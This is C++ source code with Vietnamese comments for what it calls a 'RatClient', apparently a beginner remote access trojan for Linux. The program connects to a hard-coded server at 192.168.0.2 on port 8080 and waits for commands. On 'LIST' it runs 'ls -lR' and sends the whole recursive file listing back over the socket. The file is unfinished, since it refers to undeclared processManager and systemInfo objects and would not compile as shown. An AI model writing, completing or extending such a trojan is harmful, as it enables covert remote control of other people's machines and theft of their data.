#include <iostream>
#include <fstream>
#include <filesystem>
#include <string>
#include <cstring>

// Thư viện Socket và Hệ thống trên Linux
#include <sys/socket.h>
#include <arpa/inet.h>
#include <unistd.h>
#include <netinet/in.h>
#include <unistd.h>       // Thư viện cho getusername, gethostname
#include <sys/utsname.h>  // Thư viện lấy thông tin OS (Kernel, Name)
#include <limits.h>       // Định nghĩa các hằng số giới hạn như HOST_NAME_MAX

namespace fs = std::filesystem;
const int BUFFER_SIZE = 4096;



class SocketClient {
public:
    int socket;
    void Send(const std::string&);
    std::string Receive();
};

void SocketClient::Send(const std::string& msg){
    send(socket, msg.c_str(), static_cast<int>(msg.size()), 0);
}

std::string SocketClient::Receive() {
    char buffer[BUFFER_SIZE]{};

    int bytes = recv(socket, buffer, BUFFER_SIZE, 0);

    if(bytes <= 0)
        return "";

    return std::string(buffer, bytes);
}



class FileManager {
public:
    SocketClient client;
    void HandleList();
};

// Hàm xử lý lệnh LIST (Liệt kê file)
void FileManager::HandleList() {
    char buffer[128];
    std::string result = "\n=== KET QUA TU LENH SYSTEM (ls -lR) ===\n\n";
    
    // Chạy lệnh "ls -lR" và mở một pipe để đọc kết quả (chế độ "r" - read)
    // popen sẽ chuyển hướng stdout của lệnh vào pipe này
    FILE* pipe = popen("ls -lR", "r");
    
    if (!pipe) {
        std::string errorMsg = "ERROR: Khong the thuc thi lenh he thong.\n";
        client.Send(errorMsg);
        return;
    }

    // Đọc dữ liệu từ pipe cho đến khi hết
    while (fgets(buffer, sizeof(buffer), pipe) != nullptr) {
        result += buffer;
    }

    // Đóng pipe và lấy trạng thái kết thúc của lệnh
    int returnCode = pclose(pipe);
    if (returnCode != 0) {
        result += "\n[!] Lenh ket thuc voi loi (Code: " + std::to_string(returnCode) + ")\n";
    }

    // Gửi toàn bộ kết quả trả về cho Server qua Socket
    client.Send(result);
}



class RatClient {
public:
    void Start();

private:
    SocketClient client;
    FileManager fileManager;

    void InitClientSocket();
    void Listen();

    void CommandLoop();
    void HandleCommand(const std::string& cmd);

};

void RatClient::Start() {
    InitClientSocket();
    Listen();
    CommandLoop();
}

void RatClient::InitClientSocket() {
    client.socket = socket(AF_INET, SOCK_STREAM, 0);
    fileManager.client = client;
    processManager.client = client;
    systemInfo.client = client;
    if (client.socket < 0) {
        std::cerr << "[-] Khong the tao socket!\n";
        exit(1);
    }
}

void RatClient::Listen() {
    sockaddr_in serverAddr;
    std::memset(&serverAddr, 0, sizeof(serverAddr));
    serverAddr.sin_family = AF_INET;
    serverAddr.sin_port = htons(8080); // Cổng trùng với Server

    // Chuyển đổi IP từ chuỗi text sang dạng nhị phân
    if (inet_pton(AF_INET, "192.168.0.2", &serverAddr.sin_addr) <= 0) {
        std::cerr << "[-] Dia chi IP khong hop le!\n";
        close(client.socket);
        exit(1);
    }

    std::cout << "[*] Dang ket noi den Server...\n";
    if (connect(client.socket, (sockaddr*)&serverAddr, sizeof(serverAddr)) < 0) {
        std::cerr << "[-] Ket noi that bai!\n";
        close(client.socket);
        exit(1);
    }
    std::cout << "[+] Ket noi thanh cong!\n";
}

void RatClient::CommandLoop() {
    while (true) {
        auto command = client.Receive();
        if (command.empty()) {
            std::cout << "[-] Mat ket noi voi Server.\n";
            break;
        }

        std::cout << "[*] Lenh nhan duoc: " << command << std::endl;
        HandleCommand(command);
    }
}

void RatClient::HandleCommand(const std::string& command) {
    if (command == "LIST") {
        fileManager.HandleList();
    }
}



int main() {
    RatClient client;
    client.Start();
}